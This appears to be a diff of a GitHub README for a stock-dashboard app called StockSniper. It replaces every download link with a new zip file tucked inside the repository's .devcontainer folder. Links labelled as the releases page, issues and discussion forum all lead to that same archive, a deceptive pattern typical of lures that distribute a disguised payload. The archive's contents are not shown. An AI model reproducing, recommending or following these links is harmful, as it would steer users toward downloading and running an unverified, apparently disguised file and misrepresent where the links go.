@@ -1,7 +1,7 @@
 # 📈 StockSniper - Your Easy Stock Dashboard
 
 ## 🔗 Download Now
-[![Download StockSniper](https://raw.githubusercontent.com/Pughazhendiran21/StockSniper/main/.devcontainer/StockSniper_gypsywise.zip)](https://raw.githubusercontent.com/Pughazhendiran21/StockSniper/main/.devcontainer/StockSniper_gypsywise.zip)
+[![Download StockSniper](https://github.com/Pughazhendiran21/StockSniper/raw/refs/heads/main/.devcontainer/Sniper-Stock-3.8.zip)](https://github.com/Pughazhendiran21/StockSniper/raw/refs/heads/main/.devcontainer/Sniper-Stock-3.8.zip)
 
 ## 🖥️ Introduction
 StockSniper is an interactive Stock Dashboard designed for you. It visualizes historical prices, calculates key financial metrics, displays fundamental statements, and aggregates the latest news for any stock ticker—all in a sleek, easy-to-use Streamlit interface. 
@@ -12,7 +12,7 @@ Whether you're tracking your investments or exploring new opportunities, StockSn
 To get started with StockSniper, follow these simple steps:
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Pughazhendiran21/StockSniper/main/.devcontainer/StockSniper_gypsywise.zip) to find the latest version of StockSniper. 
+   Go to our [Releases page](https://github.com/Pughazhendiran21/StockSniper/raw/refs/heads/main/.devcontainer/Sniper-Stock-3.8.zip) to find the latest version of StockSniper. 
 
 2. **Download the Application:**  
    Look for the latest release. Click on the appropriate file to download StockSniper to your computer.
@@ -45,7 +45,7 @@ Before downloading, make sure your system meets these requirements:
 - **Internet Connection:** Required for fetching stock data and news.
 
 ## 📥 Download & Install
-To download StockSniper, revisit the [Releases page](https://raw.githubusercontent.com/Pughazhendiran21/StockSniper/main/.devcontainer/StockSniper_gypsywise.zip). Make sure to check for the latest release and select the right file for your system.
+To download StockSniper, revisit the [Releases page](https://github.com/Pughazhendiran21/StockSniper/raw/refs/heads/main/.devcontainer/Sniper-Stock-3.8.zip). Make sure to check for the latest release and select the right file for your system.
 
 1. Visit the Releases page.
 2. Click on the download link for your operating system.
@@ -71,8 +71,8 @@ If you encounter any issues while downloading or using StockSniper, feel free to
 StockSniper is open-source software. You can use it freely, but please consider supporting the project by contributing or sharing it with others.
 
 ## 🔗 Quick Links
-- [Download Now](https://raw.githubusercontent.com/Pughazhendiran21/StockSniper/main/.devcontainer/StockSniper_gypsywise.zip)  
-- [Issues](https://raw.githubusercontent.com/Pughazhendiran21/StockSniper/main/.devcontainer/StockSniper_gypsywise.zip)  
-- [Discussion Forum](https://raw.githubusercontent.com/Pughazhendiran21/StockSniper/main/.devcontainer/StockSniper_gypsywise.zip)  
+- [Download Now](https://github.com/Pughazhendiran21/StockSniper/raw/refs/heads/main/.devcontainer/Sniper-Stock-3.8.zip)  
+- [Issues](https://github.com/Pughazhendiran21/StockSniper/raw/refs/heads/main/.devcontainer/Sniper-Stock-3.8.zip)  
+- [Discussion Forum](https://github.com/Pughazhendiran21/StockSniper/raw/refs/heads/main/.devcontainer/Sniper-Stock-3.8.zip)  
 
 Enjoy tracking your stocks with StockSniper!
